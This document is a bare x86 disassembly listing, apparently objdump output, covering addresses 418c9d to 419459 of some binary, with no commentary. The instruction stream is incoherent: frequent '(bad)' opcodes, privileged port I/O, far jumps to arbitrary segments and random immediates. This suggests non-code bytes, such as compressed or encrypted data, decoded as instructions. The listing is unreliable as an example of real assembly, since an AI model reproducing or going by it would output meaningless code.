  418c9d:	adc    eax,0x80884345
  418ca2:	cwde   
  418ca3:	push   ecx
  418ca4:	sbb    eax,0xa024a238
  418ca9:	cwde   
  418caa:	mov    edi,ecx
  418cac:	jmp    0xe55c:0x872350c2
  418cb3:	lahf   
  418cb4:	in     eax,dx
  418cb5:	fcmovne st,st(5)
  418cb7:	inc    eax
  418cb8:	mov    ebp,0x9cc8d540
  418cbd:	push   edx
  418cbe:	dec    ecx
  418cbf:	dec    ebp
  418cc0:	aam    0x9f
  418cc2:	jbe    0x418d20
  418cc4:	push   0x7a5fc912
  418cc9:	(bad)  
  418cca:	push   DWORD PTR [ebp+0x54d11c47]
  418cd0:	mov    eax,0x87937e86
  418cd5:	(bad)  
  418cd6:	jle    0x418d09
  418cd8:	into   
  418cd9:	dec    ch
  418cdb:	pop    ecx
  418cdc:	pop    ecx
  418cdd:	or     DWORD PTR [edx+0x1e58c79b],0x4d8ab71
  418ce7:	pop    ecx
  418ce8:	gs mov esi,0xc6bc32c8
  418cee:	in     eax,dx
  418cef:	pop    ds
  418cf0:	add    al,BYTE PTR [ecx-0x21]
  418cf3:	in     al,dx
  418cf4:	xor    eax,0xdda4d8c0
  418cf9:	js     0x418d10
  418cfb:	in     eax,0x3e
  418cfd:	jmp    0xb6b7:0xd476135e
  418d04:	or     bh,BYTE PTR [eax-0x2f]
  418d07:	retf   
  418d08:	dec    eax
  418d09:	mov    ebx,0xc2010a8f
  418d0f:	stos   DWORD PTR es:[edi],eax
  418d10:	das    
  418d11:	jo     0x418c93
  418d13:	std    
  418d14:	and    DWORD PTR [ebp-0x550ea6d0],edi
  418d1a:	sub    DWORD PTR [ebp+0x4f2ab32c],0x3a
  418d21:	push   cs
  418d22:	push   edi
  418d23:	fisttp QWORD PTR [edi+0x1]
  418d26:	outs   dx,DWORD PTR ds:[esi]
  418d27:	int3   
  418d28:	and    al,0x8f
  418d2b:	cs inc esi
  418d2d:	add    esi,eax
  418d2f:	xchg   ebx,eax
  418d30:	push   cs
  418d31:	and    eax,0xc9ddaf3d
  418d36:	fiadd  DWORD PTR [ecx-0x6a]
  418d39:	fisub  DWORD PTR [edx]
  418d3b:	test   al,0x3e
  418d3d:	pop    edi
  418d3e:	jbe    0x418dba
  418d40:	and    al,0x2b
  418d42:	mov    dl,BYTE PTR [eax-0x36]
  418d45:	jo     0x418d0a
  418d47:	sub    edi,DWORD PTR [ebp+0xc5e2a44]
  418d4d:	stos   BYTE PTR es:[edi],al
  418d4e:	lods   eax,DWORD PTR ds:[esi]
  418d4f:	out    dx,eax
  418d50:	out    dx,al
  418d51:	inc    ecx
  418d52:	inc    ecx
  418d53:	pop    ebp
  418d54:	mov    ecx,0xaf4049f9
  418d59:	stos   DWORD PTR es:[edi],eax
  418d5a:	test   al,0x18
  418d5c:	and    DWORD PTR [ebx+0x2c],0xfffffff9
  418d60:	xor    bh,0xe
  418d63:	outs   dx,DWORD PTR ds:[esi]
  418d64:	jae    0x418d78
  418d66:	xchg   esi,eax
  418d67:	mov    ah,BYTE PTR [eax]
  418d69:	int    0x5c
  418d6b:	stos   BYTE PTR es:[edi],al
  418d6c:	cmp    dh,BYTE PTR [ebx]
  418d6e:	sub    dl,BYTE PTR [esi+0x15]
  418d71:	xor    al,0x40
  418d73:	loope  0x418d88
  418d75:	aad    0x28
  418d77:	mov    ds:0xe8f9fddb,eax
  418d7c:	mov    al,ds:0x1c7cfcdf
  418d81:	div    DWORD PTR [edx]
  418d83:	cmp    al,0x85
  418d85:	push   ds
  418d86:	dec    ebx
  418d87:	test   eax,0x977dfb00
  418d8c:	adc    al,0xbf
  418d8e:	pop    eax
  418d8f:	aaa    
  418d90:	aas    
  418d91:	pop    esi
  418d92:	and    al,0x6e
  418d94:	sahf   
  418d95:	jp     0x418da9
  418d97:	das    
  418d98:	in     al,dx
  418d99:	fwait
  418d9a:	je     0x418df4
  418d9c:	js     0x418d30
  418d9e:	jle    0x418dcd
  418da0:	(bad)  
  418da1:	push   ebp
  418da2:	and    edx,DWORD PTR [ebx+0x2817b325]
  418da8:	mov    edi,0x55369769
  418dad:	(bad)
  418db0:	adc    dh,BYTE PTR [ebx+0x20]
  418db3:	fstp   TBYTE PTR [edi+0xec460db]
  418db9:	mov    eax,0xef327a08
  418dbe:	or     cl,BYTE PTR [edi-0x5f55447a]
  418dc4:	or     eax,DWORD PTR [edx]
  418dc6:	int    0x3
  418dc8:	push   eax
  418dc9:	pusha  
  418dca:	mov    esp,DWORD PTR [edx-0x3e]
  418dcd:	adc    edx,DWORD PTR [esi]
  418dcf:	into   
  418dd0:	pop    ss
  418dd1:	sub    BYTE PTR [ecx-0x1],al
  418dd4:	push   edx
  418dd5:	sbb    ebx,DWORD PTR [ebx-0x3e]
  418dd8:	int    0xbb
  418dda:	push   edi
  418ddb:	jmp    0x418df0
  418ddd:	inc    eax
  418dde:	(bad)  
  418ddf:	xor    eax,0x91c2e8c7
  418de4:	(bad)  
  418de5:	idiv   DWORD PTR ds:0xf2a8106f
  418deb:	dec    ebp
  418dec:	xchg   DWORD PTR [eax+0x7a],edi
  418def:	cmc    
  418df0:	pop    eax
  418df1:	repz pop ds
  418df3:	push   esp
  418df4:	out    0xf,al
  418df6:	outs   dx,DWORD PTR ds:[esi]
  418df7:	loope  0x418ded
  418df9:	in     eax,0xa
  418dfb:	imul   ebp,DWORD PTR [esi+0x43fefd97],0xffffffd1
  418e02:	jns    0x418dbe
  418e04:	pop    edi
  418e05:	mul    esi
  418e07:	sti    
  418e08:	mov    dl,BYTE PTR [esi]
  418e0a:	shld   DWORD PTR [edx],esi,0x16
  418e0e:	jbe    0x418e5b
  418e10:	jmp    0xec48341e
  418e15:	jecxz  0x418d98
  418e17:	das    
  418e18:	cdq    
  418e19:	arpl   WORD PTR [ecx-0x5b40b2a4],bx
  418e1f:	(bad)  
  418e20:	js     0x418e52
  418e22:	push   es
  418e23:	js     0x418e7d
  418e25:	dec    esi
  418e26:	shl    DWORD PTR [edx+0x68386348],cl
  418e2c:	mov    ecx,0xbecd1f4b
  418e31:	popa   
  418e32:	sbb    cl,BYTE PTR [ebp-0x6f8e1d84]
  418e38:	mov    ah,0x39
  418e3a:	repnz ins BYTE PTR es:[edi],dx
  418e3c:	xchg   edi,eax
  418e3d:	add    esp,DWORD PTR gs:[ebp-0x284775b0]
  418e44:	ins    BYTE PTR es:[edi],dx
  418e45:	sub    eax,0xc2faf0b5
  418e4a:	add    ebx,DWORD PTR [ecx+eiz*8]
  418e4d:	sbb    eax,0x5090dc76
  418e52:	je     0x418eb5
  418e54:	fs adc edi,DWORD PTR ss:[ecx]
  418e58:	dec    esi
  418e59:	sahf   
  418e5a:	xchg   ecx,eax
  418e5b:	jns    0x418ec8
  418e5d:	dec    esi
  418e5e:	int3   
  418e5f:	push   ebx
  418e60:	mov    ds:0xe04af779,al
  418e65:	mov    eax,0xb39cbf4
  418e6a:	sub    edi,ebx
  418e6c:	or     BYTE PTR [edi+0x67],dl
  418e6f:	jle    0x418e6e
  418e71:	sub    BYTE PTR [ebx+ebp*4],ch
  418e74:	mov    ds,WORD PTR [ecx+0x6f463afa]
  418e7a:	jne    0x418e55
  418e7c:	scas   al,BYTE PTR es:[edi]
  418e7d:	scas   eax,DWORD PTR es:[edi]
  418e7e:	push   esp
  418e7f:	outs   dx,BYTE PTR ds:[esi]
  418e80:	rcl    DWORD PTR [esi+0x63],0x7e
  418e84:	sub    al,0x29
  418e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e87:	inc    BYTE PTR [edi]
  418e89:	ss xchg ebx,ecx
  418e8c:	mov    bh,0xef
  418e8e:	out    0x47,eax
  418e90:	fs xchg edi,eax
  418e92:	add    esi,DWORD PTR [ecx-0x7b]
  418e95:	and    al,0x80
  418e97:	jmp    0xc251fd19
  418e9c:	out    dx,eax
  418e9d:	in     eax,0x63
  418e9f:	mov    bh,0xbc
  418ea1:	jmp    0x6be3bc04
  418ea6:	iret   
  418ea7:	nop
  418ea8:	cmp    BYTE PTR [ebx+eax*2],bh
  418eab:	jbe    0x418ed1
  418ead:	jo     0x418e93
  418eaf:	dec    esi
  418eb0:	dec    ecx
  418eb1:	not    BYTE PTR [edi+edi*4+0x5]
  418eb5:	cmp    eax,0xff6d2911
  418eba:	sub    edx,DWORD PTR [edi+0x522c4b90]
  418ec0:	or     al,0x2f
  418ec2:	mov    ss,ebx
  418ec4:	stos   BYTE PTR es:[edi],al
  418ec5:	xchg   esi,eax
  418ec6:	retf   
  418ec7:	ficomp DWORD PTR [edi+0x34]
  418eca:	mov    fs,WORD PTR [eax-0x13]
  418ecd:	xchg   BYTE PTR [eax+0x249d8a53],cl
  418ed3:	retf   
  418ed4:	mov    esp,0xb72179bc
  418ed9:	xchg   ebp,eax
  418eda:	add    ch,bl
  418edc:	mov    gs,WORD PTR [esi-0x4190a634]
  418ee2:	push   esp
  418ee3:	sub    DWORD PTR [ebx+edx*4],ecx
  418ee6:	and    DWORD PTR [ebp+0x771f8d7a],esi
  418eec:	mov    ds:0x13512900,al
  418ef1:	fild   WORD PTR [ebp*2+0x41b781e3]
  418ef8:	das    
  418ef9:	out    0x70,al
  418efb:	jp     0x418eac
  418efd:	daa    
  418efe:	or     ah,BYTE PTR [edi-0x48ee7e9f]
  418f04:	cmc    
  418f05:	sub    ecx,esi
  418f07:	mov    ch,0xb6
  418f09:	sbb    eax,0x2a5206d4
  418f0e:	mov    bl,0x28
  418f10:	test   esi,edx
  418f12:	lea    eax,[ebp-0x5e]
  418f15:	data16 test ah,ch
  418f18:	test   ebx,0xda3525c6
  418f1e:	int3   
  418f1f:	inc    eax
  418f20:	cmp    al,0xf0
  418f22:	mov    bl,0x1
  418f24:	xlat   BYTE PTR ds:[ebx]
  418f25:	rcr    ebp,1
  418f27:	or     DWORD PTR [ecx+eax*8+0x15],ebx
  418f2b:	sbb    al,0x1a
  418f2d:	dec    edx
  418f2e:	xchg   BYTE PTR [eax+0x58],bl
  418f31:	sbb    esp,DWORD PTR [edi-0x3c]
  418f34:	mov    ebp,eax
  418f36:	dec    esi
  418f37:	jmp    0x418fa3
  418f39:	dec    ebx
  418f3a:	jg     0x418ed8
  418f3c:	dec    ebp
  418f3d:	not    DWORD PTR [esi-0x11]
  418f40:	xor    edx,eax
  418f42:	out    0x2e,eax
  418f44:	mov    ds:0x6e37ea8c,al
  418f49:	fst    QWORD PTR [ebp-0x6f]
  418f4c:	mov    edx,0x837ee6f
  418f51:	dec    edi
  418f52:	pop    ss
  418f53:	ins    BYTE PTR es:[edi],dx
  418f54:	shl    DWORD PTR [ebp+0x6b],cl
  418f57:	stos   BYTE PTR es:[edi],al
  418f58:	adc    eax,0xc925eae2
  418f5d:	mov    ecx,0xb25fe287
  418f62:	pop    ebx
  418f63:	push   edi
  418f64:	fild   WORD PTR [ebp-0xa]
  418f67:	dec    esp
  418f68:	jb     0x418f4d
  418f6a:	push   ecx
  418f6b:	and    eax,0xe4ac8c40
  418f70:	lahf   
  418f71:	rcl    bl,cl
  418f73:	mov    eax,0x9380fda9
  418f78:	or     eax,0xc14f0bf3
  418f7d:	xchg   ecx,eax
  418f7e:	into   
  418f7f:	cwde   
  418f80:	cmp    bl,BYTE PTR [edi-0x9d44b79]
  418f86:	hlt    
  418f87:	jl     0x418f32
  418f89:	call   FWORD PTR [edx+edi*1-0x36]
  418f8d:	push   ss
  418f8e:	outs   dx,BYTE PTR ds:[esi]
  418f8f:	sub    BYTE PTR [ecx-0x49],0x3
  418f93:	mov    al,ds:0x45eef4f
  418f98:	adc    al,0x72
  418f9a:	ds test al,0xba
  418f9d:	aam    0x7b
  418f9f:	(bad)  
  418fa0:	pop    ds
  418fa1:	fisubr WORD PTR [ebx+edi*1-0x2e88d402]
  418fa8:	ja     0x418f75
  418faa:	add    eax,DWORD PTR [edi+esi*1]
  418fad:	dec    esi
  418fae:	sub    dh,bl
  418fb0:	mov    bh,0xa2
  418fb2:	int    0x20
  418fb4:	and    esp,DWORD PTR [edi+ecx*1]
  418fb7:	sub    ah,dh
  418fb9:	and    eax,0xb61a74a2
  418fbe:	add    al,0x4d
  418fc0:	jns    0x419011
  418fc2:	call   0x8f0b:0xfbec16f3
  418fc9:	push   ebp
  418fca:	pusha  
  418fcb:	jae    0x418fc7
  418fcd:	nop
  418fce:	xchg   esp,ecx
  418fd0:	call   0xa5d7add
  418fd5:	stos   DWORD PTR es:[edi],eax
  418fd6:	fld    TBYTE PTR [edx-0x3c]
  418fd9:	out    0xb4,eax
  418fdb:	ror    BYTE PTR [ebx-0x3a],cl
  418fde:	jecxz  0x418f96
  418fe0:	call   0x79c00f4e
  418fe5:	gs push cs
  418fe7:	inc    esp
  418fe8:	cld    
  418fe9:	mov    ds:0x7a57c4bf,al
  418fee:	xchg   ebx,eax
  418fef:	sahf   
  418ff0:	mov    al,0x37
  418ff2:	or     al,0xc5
  418ff4:	mov    al,0xaf
  418ff6:	lahf   
  418ff7:	enter  0xf18,0xb3
  418ffb:	ret    
  418ffc:	push   eax
  418ffd:	repnz fnstsw WORD PTR [esi]
  419000:	pop    edi
  419001:	je     0x418fe4
  419003:	xchg   esi,eax
  419004:	jno    0x418fe5
  419006:	add    al,0x3
  419008:	inc    edx
  419009:	fist   WORD PTR [eax-0x2fd06d8]
  41900f:	cmp    DWORD PTR fs:[eax-0x72d8d345],edx
  419016:	push   edi
  419017:	popa   
  419018:	jp     0x419063
  41901a:	cdq    
  41901b:	jg     0x418fa1
  41901d:	xlat   BYTE PTR ds:[ebx]
  41901e:	xor    BYTE PTR [ebp-0x64],cl
  419021:	jno    0x41902d
  419023:	stos   BYTE PTR es:[edi],al
  419024:	cmp    DWORD PTR [edx+0x652a4d5f],0x14
  41902b:	add    dl,BYTE PTR [edx-0x4f35bca7]
  419031:	cmc    
  419032:	addr16 imul ebx,edx,0xffffffe7
  419036:	out    0xb5,eax
  419038:	dec    ecx
  419039:	aas    
  41903a:	lods   eax,DWORD PTR ds:[esi]
  41903b:	ret    
  41903c:	out    0x39,al
  41903e:	jg     0x41905b
  419040:	add    cl,BYTE PTR [ecx-0x1da190b8]
  419046:	(bad)  
  419047:	mov    ds:0x69d7a3d,eax
  41904c:	pop    ebx
  41904d:	call   0x7a06:0x6f841235
  419054:	cli    
  419055:	or     edi,DWORD PTR [ebp+edi*8+0x6ddec087]
  41905c:	inc    BYTE PTR [eax+0x248c1352]
  419062:	cmp    al,0x39
  419064:	sub    bh,0x96
  419067:	mov    cl,BYTE PTR [esi-0x37e43f8f]
  41906d:	mov    eax,ds:0x60964b47
  419072:	mov    esp,0x202d853c
  419077:	mov    ebp,gs
  419079:	sbb    eax,0x24cb64a
  41907e:	out    0x4c,al
  419080:	cmp    eax,0x99e32a49
  419085:	stos   BYTE PTR es:[edi],al
  419086:	sbb    bl,BYTE PTR [edx]
  419088:	fs mov eax,0x7892e8c0
  41908e:	push   edi
  41908f:	push   eax
  419090:	push   es
  419091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419093:	aad    0xb6
  419095:	dec    BYTE PTR [ebx-0x29]
  419098:	(bad)  
  41909a:	xchg   edx,eax
  41909b:	cmp    BYTE PTR [esi],bl
  41909d:	push   0x27f2973a
  4190a2:	xchg   ebx,eax
  4190a3:	retf   0xdd38
  4190a6:	lods   eax,DWORD PTR ds:[esi]
  4190a7:	cs out 0x5,al
  4190aa:	das    
  4190ab:	sub    ch,0x18
  4190ae:	mov    cl,0xc0
  4190b0:	imul   esi,esi,0xb8b28fa7
  4190b6:	xchg   ecx,eax
  4190b7:	inc    esp
  4190b8:	sti    
  4190b9:	fst    DWORD PTR [esi]
  4190bb:	test   al,0x85
  4190bd:	push   ebx
  4190be:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c0:	inc    edx
  4190c1:	test   al,0xf6
  4190c3:	or     eax,esi
  4190c5:	fsubr  QWORD PTR [eax+0x57]
  4190c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c9:	imul   edx,esp,0xe8f574be
  4190cf:	mov    edi,DWORD PTR [edx-0x54934bad]
  4190d5:	out    dx,al
  4190d6:	jmp    0x4190c7
  4190d8:	and    ch,dh
  4190da:	xchg   DWORD PTR [esi-0xa7312de],esi
  4190e0:	jmp    0x56cc:0xaae7f7da
  4190e7:	mov    ebx,DWORD PTR [edi]
  4190e9:	aad    0xe7
  4190eb:	sti    
  4190ec:	adc    ecx,ebp
  4190ee:	dec    ebx
  4190ef:	bound  esi,QWORD PTR ds:0xb20954fe
  4190f5:	sbb    edx,edx
  4190f7:	sbb    al,0x27
  4190f9:	cld    
  4190fa:	sub    ebx,DWORD PTR [esi]
  4190fc:	cmp    ah,0xec
  4190ff:	xlat   BYTE PTR ds:[ebx]
  419100:	out    0x92,eax
  419102:	mov    cl,0x26
  419104:	rcr    BYTE PTR [esi],cl
  419106:	jb     0x4190ac
  419108:	add    DWORD PTR [eax],esi
  41910a:	mov    ebx,0x78efb783
  41910f:	push   DWORD PTR [ecx]
  419111:	xor    eax,0x9cad21d8
  419116:	mov    esp,DWORD PTR [edi-0x15]
  419119:	test   BYTE PTR [edx+0x5f4d7bd5],ch
  41911f:	mov    eax,0xe2302d7f
  419124:	or     eax,0x4bd61658
  419129:	leave  
  41912a:	(bad)  
  41912b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41912c:	enter  0xa3db,0x7e
  419130:	in     eax,0x33
  419132:	enter  0x6e8,0x55
  419136:	nop
  419137:	xor    bh,0x74
  41913a:	mov    bl,ch
  41913c:	xlat   BYTE PTR ds:[ebx]
  41913d:	test   DWORD PTR es:[ecx+0x43],edx
  419141:	jae    0x4190d0
  419143:	mov    dh,0xe9
  419145:	je     0x41910d
  419147:	fdiv   DWORD PTR [ecx-0x16]
  41914a:	push   ecx
  41914b:	les    ebx,FWORD PTR [ebp-0x30]
  41914e:	retf   
  41914f:	push   0xffffffe3
  419151:	push   edx
  419152:	push   eax
  419153:	in     eax,0x41
  419155:	jbe    0x4191a9
  419157:	inc    edx
  419158:	ja     0x4191d5
  41915a:	mov    WORD PTR [edi],?
  41915c:	hlt    
  41915d:	sbb    BYTE PTR [edi+0x16835949],bl
  419163:	icebp  
  419164:	xlat   BYTE PTR ds:[ebx]
  419165:	cmp    eax,0xa303f48d
  41916a:	out    dx,al
  41916b:	push   edx
  41916c:	retf   0xd9e2
  41916f:	popa   
  419170:	sub    al,0xb4
  419172:	xchg   ebp,eax
  419173:	push   0x3fc96fd6
  419178:	mov    edi,0xdda2cae2
  41917d:	fdiv   st,st(5)
  41917f:	mov    eax,ds:0x47ee245f
  419184:	or     eax,0xa03719c
  419189:	sub    eax,0x7d9cd167
  41918e:	mov    ah,0x7d
  419190:	mov    WORD PTR [ebx-0x737c9f10],cs
  419196:	add    edi,DWORD PTR ds:0x8da42248
  41919c:	ins    DWORD PTR es:[edi],dx
  41919d:	cdq    
  41919e:	rol    DWORD PTR [edx-0x1a],1
  4191a1:	pushf  
  4191a2:	iret   
  4191a3:	and    BYTE PTR ds:0xab2b84f7,bl
  4191a9:	xchg   BYTE PTR ds:0xb3fc99cf,dl
  4191af:	lods   al,BYTE PTR ds:[esi]
  4191b0:	rcr    DWORD PTR [edi],cl
  4191b2:	sbb    eax,0xe51e20b
  4191b7:	mov    WORD PTR [edx],ss
  4191b9:	fnstcw WORD PTR [eax]
  4191bb:	add    al,0x5b
  4191bd:	pusha  
  4191be:	loopne 0x4191ec
  4191c0:	mov    BYTE PTR [ebp-0x5936fada],ch
  4191c6:	shl    DWORD PTR [ebx+0x27f7691f],0xb7
  4191cd:	sub    DWORD PTR [ebp+0x58d1cda1],0x9edc03a5
  4191d7:	sbb    DWORD PTR [esi],eax
  4191d9:	add    al,0x8c
  4191db:	mov    ah,0x37
  4191dd:	cmp    BYTE PTR [ebp+0x1d],ah
  4191e0:	inc    esi
  4191e1:	(bad)  
  4191e2:	dec    DWORD PTR [eax+0x15]
  4191e5:	inc    esp
  4191e6:	test   al,0x8f
  4191e8:	icebp  
  4191e9:	xchg   esi,eax
  4191ea:	(bad)  
  4191eb:	fistp  QWORD PTR [ebx-0x48233b7]
  4191f1:	mov    eax,0x37d728fb
  4191f6:	(bad)  
  4191f7:	aad    0x9b
  4191f9:	push   esp
  4191fa:	addr16 popf 
  4191fc:	dec    DWORD PTR [ebp-0x80]
  4191ff:	cld    
  419200:	mov    ecx,0x95598db
  419205:	sahf   
  419206:	inc    esp
  419207:	lods   al,BYTE PTR ds:[esi]
  419208:	push   0x2abb244
  41920d:	and    di,WORD PTR [ebp-0x23]
  419211:	cmc    
  419212:	mov    esi,0xdf8621b5
  419217:	xlat   BYTE PTR ds:[ebx]
  419218:	fadd   st,st(4)
  41921a:	lods   eax,DWORD PTR ds:[si]
  41921c:	xlat   BYTE PTR ds:[ebx]
  41921d:	cmp    DWORD PTR [esi],eax
  41921f:	cmp    esp,0xfffffff3
  419222:	test   DWORD PTR [edx-0x6c],ebx
  419225:	mov    ah,0xd6
  419227:	test   BYTE PTR [ecx+0x59],cl
  41922a:	push   edx
  41922b:	sub    DWORD PTR [ecx],0xffffffed
  41922e:	jg     0x419209
  419230:	pop    eax
  419231:	out    dx,eax
  419232:	in     al,0x1f
  419234:	in     eax,0x62
  419236:	fild   DWORD PTR es:0x1016b430
  41923d:	mov    DWORD PTR [ecx],edi
  41923f:	fmul   QWORD PTR [edx]
  419241:	neg    DWORD PTR [ecx]
  419243:	std    
  419244:	or     al,0x9e
  419246:	stos   DWORD PTR es:[edi],eax
  419247:	ja     0x419265
  419249:	ja     0x41929e
  41924b:	mov    esi,0x28bdff38
  419250:	mov    ds:0xf87e1f97,eax
  419255:	out    0x19,eax
  419257:	cmp    DWORD PTR [esi-0x3638997c],esi
  41925d:	push   edi
  41925e:	push   0x41
  419260:	push   0xc
  419262:	adc    ah,BYTE PTR [ecx]
  419264:	lock in eax,0xd5
  419267:	sbb    cl,ch
  419269:	sbb    DWORD PTR [edi-0x280026b3],eax
  41926f:	les    ebp,FWORD PTR [ecx*8-0x7d01abcb]
  419276:	xchg   ebx,eax
  419277:	mov    ds:0x6f76e403,eax
  41927c:	inc    edx
  41927d:	ror    DWORD PTR [ebx+eiz*8],0xc2
  419281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419282:	leave  
  419283:	in     eax,dx
  419284:	xor    eax,0xac59b419
  419289:	outs   dx,DWORD PTR ds:[esi]
  41928a:	ja     0x4192a9
  41928c:	ror    BYTE PTR [ecx+0x11b2d127],cl
  419292:	add    eax,0x89cd2382
  419297:	mov    edx,0xfabbe46e
  41929c:	dec    edi
  41929d:	pop    eax
  41929e:	adc    DWORD PTR [ebx+0x13],eax
  4192a1:	outs   dx,DWORD PTR ds:[esi]
  4192a2:	shl    ch,0xbd
  4192a5:	test   BYTE PTR [edi+0x22],dh
  4192a8:	jbe    0x41926f
  4192aa:	out    0x96,eax
  4192ac:	ins    DWORD PTR es:[edi],dx
  4192ad:	pop    es
  4192ae:	arpl   WORD PTR [esi-0x2d],cx
  4192b1:	sub    BYTE PTR [edx+0x2f00225],dh
  4192b7:	xor    eax,edi
  4192b9:	popa   
  4192ba:	cdq    
  4192bb:	(bad)  
  4192bc:	fs xchg ecx,eax
  4192be:	gs retf 0x1354
  4192c2:	jmp    0x4192a4
  4192c4:	ja     0x419290
  4192c6:	mov    ecx,0x889e0f1
  4192cb:	and    eax,0x761d4f25
  4192d0:	sbb    BYTE PTR [edx],dl
  4192d2:	loop   0x419266
  4192d4:	fnop   
  4192d6:	xchg   esi,eax
  4192d7:	or     bl,BYTE PTR [esi+0xc]
  4192da:	jmp    0x41926b
  4192dc:	out    0x80,eax
  4192de:	sub    dl,dh
  4192e0:	fcomp  QWORD PTR ds:0x64dc3215
  4192e6:	push   ebx
  4192e7:	add    dl,BYTE PTR [eax]
  4192e9:	std    
  4192ea:	lods   al,BYTE PTR ds:[esi]
  4192eb:	sub    al,0xd7
  4192ed:	pop    ecx
  4192ee:	fwait
  4192ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f0:	jnp    0x419366
  4192f2:	and    BYTE PTR [ecx+0xd],al
  4192f5:	lods   al,BYTE PTR ds:[esi]
  4192f6:	arpl   WORD PTR [ecx-0x675098ac],di
  4192fc:	(bad)  
  4192fd:	retf   
  4192fe:	xor    eax,0xf2819f11
  419303:	push   0xead97b96
  419308:	push   esp
  419309:	outs   dx,DWORD PTR ds:[esi]
  41930a:	inc    ebp
  41930b:	inc    ecx
  41930c:	cmc    
  41930d:	rcr    BYTE PTR [eax-0x56],1
  419310:	jo     0x4192e7
  419312:	cmp    ecx,ebx
  419314:	call   0x97cf1444
  419319:	pop    edi
  41931a:	mov    edi,0xb998fa8f
  41931f:	or     BYTE PTR [esi],dl
  419321:	inc    edi
  419322:	(bad)  
  419323:	and    eax,0x4380e0f8
  419328:	je     0x4192e8
  41932a:	call   0xa725:0xe1f9d166
  419331:	mov    bh,0xbf
  419333:	icebp  
  419334:	inc    cx
  419336:	cmp    ecx,DWORD PTR ds:0x78791048
  41933c:	pop    eax
  41933d:	fwait
  41933e:	jo     0x4192c1
  419340:	and    DWORD PTR [ebx],ebx
  419342:	or     bl,al
  419344:	in     al,dx
  419345:	sahf   
  419346:	push   ss
  419347:	es addr16 dec ebp
  41934a:	mov    eax,ds:0xcd6c16c1
  41934f:	add    bh,BYTE PTR [ebx]
  419351:	ret    0xf5f3
  419354:	push   0x56
  419356:	xor    al,0xb6
  419358:	xor    edi,esp
  41935a:	mov    dl,dl
  41935c:	jns    0x4192ef
  41935e:	jne    0x41930f
  419360:	jno    0x4193b1
  419362:	clc    
  419363:	adc    edx,ebp
  419365:	shl    edx,1
  419367:	ret    
  419368:	cwde   
  419369:	inc    ebp
  41936a:	xchg   edx,eax
  41936b:	xor    edi,ecx
  41936d:	jmp    0x419370
  41936f:	es lock dec esi
  419372:	(bad)  
  419373:	cld    
  419374:	popf   
  419375:	mov    ah,0xc6
  419377:	mov    BYTE PTR [ecx],bh
  419379:	dec    edi
  41937a:	push   ds
  41937b:	pop    ss
  41937c:	push   ebx
  41937d:	mov    ebx,0xf3947998
  419382:	lea    ebp,[edx+0x470bbfec]
  419388:	pushf  
  419389:	into   
  41938a:	ins    BYTE PTR es:[edi],dx
  41938b:	pusha  
  41938c:	add    al,0xb8
  41938e:	lods   al,BYTE PTR ds:[esi]
  41938f:	lods   eax,DWORD PTR ds:[esi]
  419390:	out    dx,al
  419391:	leave  
  419392:	nop
  419393:	shl    ch,1
  419395:	mov    edx,0x1c84ea5d
  41939a:	scas   al,BYTE PTR es:[edi]
  41939b:	aaa    
  41939c:	out    0x30,eax
  41939e:	test   al,0x66
  4193a0:	dec    edi
  4193a1:	push   ds
  4193a2:	lods   eax,DWORD PTR fs:[esi]
  4193a4:	out    0x7d,al
  4193a6:	xchg   edx,eax
  4193a7:	pop    esi
  4193a8:	pop    edi
  4193a9:	cmp    eax,0x83d106ab
  4193ae:	js     0x4193f3
  4193b0:	jmp    0x7349:0xa8025f4d
  4193b7:	xor    eax,0x9816701e
  4193bc:	lea    ecx,[edx]
  4193be:	loope  0x4193af
  4193c0:	add    al,0x6a
  4193c2:	sbb    bl,BYTE PTR [esp+ebp*8-0x3c]
  4193c6:	and    esi,DWORD PTR [edx-0x68e151e5]
  4193cc:	jbe    0x4193e9
  4193ce:	pop    es
  4193cf:	inc    esi
  4193d0:	cli    
  4193d1:	cmp    dl,BYTE PTR [edx]
  4193d3:	mov    esp,esi
  4193d5:	sti    
  4193d6:	push   ebx
  4193d7:	loop   0x4193f4
  4193d9:	scas   al,BYTE PTR es:[edi]
  4193da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193db:	jo     0x41937a
  4193dd:	fistp  QWORD PTR [esp+edx*1-0x1605c28f]
  4193e4:	dec    esp
  4193e5:	jo     0x419444
  4193e7:	mov    dl,0x7c
  4193e9:	jle    0x4193a3
  4193eb:	sbb    dh,BYTE PTR [edi]
  4193ed:	sti    
  4193ee:	pop    edx
  4193ef:	in     al,dx
  4193f0:	jecxz  0x41943e
  4193f2:	repz adc al,cl
  4193f5:	bound  ebp,QWORD PTR [esp+ecx*2]
  4193f8:	mov    esi,0x827aa443
  4193fd:	jbe    0x4193d9
  4193ff:	push   eax
  419400:	push   0x75ea2ba9
  419405:	ins    BYTE PTR es:[edi],dx
  419406:	daa    
  419407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419408:	in     al,dx
  419409:	sub    DWORD PTR [ebp*8-0x10c35725],esp
  419410:	ds pop ds
  419412:	sbb    al,0x19
  419414:	rcr    BYTE PTR [ebp-0x4d44bafa],0xeb
  41941b:	add    eax,0x12e4ee5c
  419421:	inc    ebx
  419422:	xor    edi,ecx
  419424:	stos   BYTE PTR es:[edi],al
  419425:	inc    esp
  419426:	fs pushf 
  419428:	sub    eax,DWORD PTR [ecx]
  41942a:	inc    ebx
  41942b:	aam    0x31
  41942d:	sub    DWORD PTR [eax+0x1a50b73b],0xffffffc3
  419434:	push   ecx
  419435:	scas   al,BYTE PTR es:[edi]
  419436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419437:	sub    dl,BYTE PTR [ebx-0x37]
  41943a:	jnp    0x4193e9
  41943c:	test   eax,eax
  41943e:	pop    edi
  41943f:	cmc    
  419440:	mov    al,ds:0x238184f5
  419445:	mov    eax,0x5909b680
  41944a:	or     al,0x2
  41944c:	adc    BYTE PTR [ecx+eiz*8],bh
  41944f:	and    eax,0xc33ab69a
  419454:	retf   0x1b02
  419457:	mov    al,0x1d
  419459:	je     0x4193f9
